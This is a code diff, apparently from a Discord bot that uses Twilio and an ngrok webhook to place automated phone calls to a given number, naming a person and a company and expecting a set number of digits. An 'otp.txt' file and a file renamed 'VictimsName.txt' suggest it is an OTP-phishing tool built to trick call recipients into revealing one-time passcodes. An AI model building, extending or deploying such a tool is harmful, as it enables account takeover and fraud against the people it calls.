@@ -10,17 +10,17 @@ import os
 import json
 
 if not 'Config.txt' in os.listdir():
-    open('Config.txt', 'w').write('{"account_sid":"", "auth_token":"", "Twilio Phone Number":"+19990009999", "ngrok_url":"https://sdhjkds-sdjs.ngrok.io", "server_id":"", "bot_token":""}')
+    open('Config.txt', 'w').write('{"account_sid":"", "auth_token":"", "Twilio Phone Number":"+19990009999", "ngrok_url":"https://example.ngrok.io", "server_id":"", "bot_token":""}')
 if not 'otp.txt' in os.listdir():
     open('otp.txt', 'w').close()
-if not 'Extra' in os.listdir():
-    os.mkdir('Extra')
-if not 'Company Name.txt' in os.listdir('Extra'):
-    open('Extra/Company Name.txt', 'w').close()
-if not 'Digits.txt' in os.listdir('Extra'):
-    open('Extra/Digits.txt', 'w').close()
-if not 'Name.txt' in os.listdir('Extra'):
-    open('Extra/Name.txt', 'w').close()
+if not 'EnteredData' in os.listdir():
+    os.mkdir('EnteredData')
+if not 'Company Name.txt' in os.listdir('EnteredData'):
+    open('EnteredData/Company Name.txt', 'w').close()
+if not 'Digits.txt' in os.listdir('EnteredData'):
+    open('EnteredData/Digits.txt', 'w').close()
+if not 'VictimsName.txt' in os.listdir('EnteredData'):
+    open('EnteredData/Name.txt', 'w').close()
 
 raw_config = json.loads(open('Config.txt', 'r').read())
 
@@ -71,9 +71,9 @@ app = Flask(__name__)
 )
 async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=str):
     await ctx.send('Nothing Just Want To Avoid Error')
-    open('Extra/Digits.txt', 'w').write(f'{digits}')
-    open('Extra/Name.txt', 'w').write(f'{name}')
-    open('Extra/Company Name.txt', 'w').write(f'{companyname}')
+    open('EnteredData/Digits.txt', 'w').write(f'{digits}')
+    open('EnteredData/Name.txt', 'w').write(f'{name}')
+    open('EnteredData/Company Name.txt', 'w').write(f'{companyname}')
     call = client.calls.create(
         url=f'{ngrok}/voice',
         to=f'{phone}',
@@ -175,9 +175,9 @@ async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=s
     ]
 )
 async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=str):
-    open('Extra/Digits.txt', 'w').write(f'{digits}')
-    open('Extra/Name.txt', 'w').write(f'{name}')
-    open('Extra/Company Name.txt', 'w').write(f'{companyname}')
+    open('EnteredData/Digits.txt', 'w').write(f'{digits}')
+    open('EnteredData/Name.txt', 'w').write(f'{name}')
+    open('EnteredData/Company Name.txt', 'w').write(f'{companyname}')
     call = client.calls.create(
         url=f'{ngrok}/voiceagain',
         to=f'{phone}',
